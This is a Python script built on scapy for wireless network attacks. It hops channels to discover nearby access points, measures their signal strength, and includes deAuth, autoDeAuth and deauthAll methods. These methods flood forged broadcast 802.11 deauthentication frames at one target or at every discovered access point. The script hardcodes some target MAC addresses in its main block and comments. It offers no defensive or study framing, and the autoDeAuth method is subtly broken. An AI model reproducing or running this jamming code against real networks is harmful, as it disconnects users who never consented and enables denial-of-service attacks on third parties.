from operator import ne
import sys, os, signal,json
from multiprocessing import Process
from itsdangerous import exc
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp,Dot11Elt, RadioTap, sendp, Dot11Deauth
from scapy.all import *

def channel_hopper():
        while True:
            try:
                channel = random.randrange(1,14)
                #exe = "iw dev %s set channel %d" % ("wlan1", channel)
                exe = f"iwconfig wlan1 channel {channel}"
                os.system(exe)
                time.sleep(1)
            except KeyboardInterrupt:
                break


class Ap:
    def __init__ (self, ssid, bssid, channel, enc):
        self.ssid = ssid
        self.bssid = bssid
        self.channel = channel
        self.enc = enc
    def getApInfo(self):
        return {"ssid":self.ssid,"bssid":self.bssid,"channel":self.channel}

class Network:
    def __init__(self, interface):
        self.interface = interface
        self.aps = {}   
        self.target = ""
        self.rssList = []
        self.attackAP = []
        self.processList = []
    def updateApList(self):
        self.hopStart()
        sniff(iface=self.interface, prn=self.sniffAP, timeout=10)
        self.hopStop()

    def getApList(self):
        ls = []
        for data in self.aps.keys():
            ls.append(self.aps[data].getApInfo())
        
        return ls

    def getPowerData(self, adr, channel):
        print(adr, channel)
        self.target = adr
        self.rssList = []
        self.setChannel(channel)
        sniff(iface=self.interface, prn=self.getRssi, count=25)
        res = -100
        try:
            res = sum(self.rssList) / len(self.rssList)
        except:
            res = -100
        return  res

    def getRssi(self, pkt):
        if pkt.haslayer(Dot11):
            if pkt.type == 0 and pkt.subtype == 8 :
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    if pkt.addr3 == self.target:
                        try:
                            rssi = pkt[RadioTap].dBm_AntSignal
                        except:
                            rssi = -100
                        print(rssi)
                        self.rssList.append(rssi)

    def setChannel(self, channel):
        #exe = "iw dev %s set channel %d" % (self.interface, channel)
        exe = f"iwconfig {self.interface} channel {channel}"
        os.system(exe)
    def hopStop(self):
        for pro in self.processList:
            pro.terminate()
            pro.join()
        self.processList.clear()
    def hopStart(self):
        tmpProcess = Process(target = channel_hopper)
        tmpProcess.start()
        self.processList.append(tmpProcess)
    def sniffAP(self, pkt):
        if( (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and not pkt[Dot11].addr3 in self.aps.keys()):
            try:
                ssid       = pkt[Dot11Elt].info
                bssid      = pkt[Dot11].addr3    
                channel    = int( ord(pkt[Dot11Elt:3].info))
                capability = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}\
                        {Dot11ProbeResp:%Dot11ProbeResp.cap%}")
                
                # Check for encrypted networks
                if re.search("privacy", capability): enc = 'Y'
                else: enc  = 'N'

                # Save discovered AP
                
                self.aps[pkt[Dot11].addr3] = Ap(ssid.decode('ascii'), str(bssid), str(channel), enc)
                # Display discovered AP    
                print ("%02d  %s  %s %s" % (int(channel), enc, bssid, ssid.decode('ascii')))
            except Exception as e:
                print(e)
                
    def deAuth(self, apAdr, channel):
        self.setChannel(channel)
        ap = apAdr
        client = "FF:FF:FF:FF:FF:FF"
        pkt = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth(reason=7)
        sendp(pkt, iface=self.interface, inter=0.100, loop=1, count=20)
    def autoDeAuth(self):
            time.sleep(1)
            print(self.attackAP)
            print("thread:",id(self.attackAP))
            for i in self.aps:
                try:
                    pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=i.bssid, addr3=i.bssid) / Dot11Deauth(reason=7)
                    print(i, "Send Deauth Packet")
                    sendp(pkt, iface=self.interface, inter=0.1, loop=1, count=30)
                except:
                    continue
    def deauthAll(self):
        aplist = self.getApList()
        for ap in aplist:
            print("Now Attack:", ap['ssid'], ap['bssid'])
            self.setChannel(int(ap['channel']))
            pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
            sendp(pkt, iface=self.interface, inter=0.1, loop=1, count=30)

if __name__ == "__main__":


    # Start the channel hopper

    network = Network("wlan1")
    #print("set channel")
    network.hopStart()
    time.sleep(4)
    network.hopStop()

    network.hopStart()
    #print("dar", network.getPowerData("fc:7f:f1:b0:55:80", 6))
    network.getPowerData("fc:7f:f1:ae:80:e0", 11)
    #network.deAuth("FF:FF:FF:FF:FF:FF", "90:9f:33:1b:13:aa", 1)
    #network.deAuth("FF:FF:FF:FF:FF:FF", "FF:FF:FF:FF:FF:FF", 1)
    #network.deAuth("08:AE:D6:01:98:5F", "90:9f:33:1b:13:aa", 1)
    #network.updateApList(p)
    #print(network.getApList())
    #p2 = Process(target=network.getPowerData)
    #p2.start()
    # Start the sniffer

    #sniff(iface=network.interface, prn=network.sniffAP)
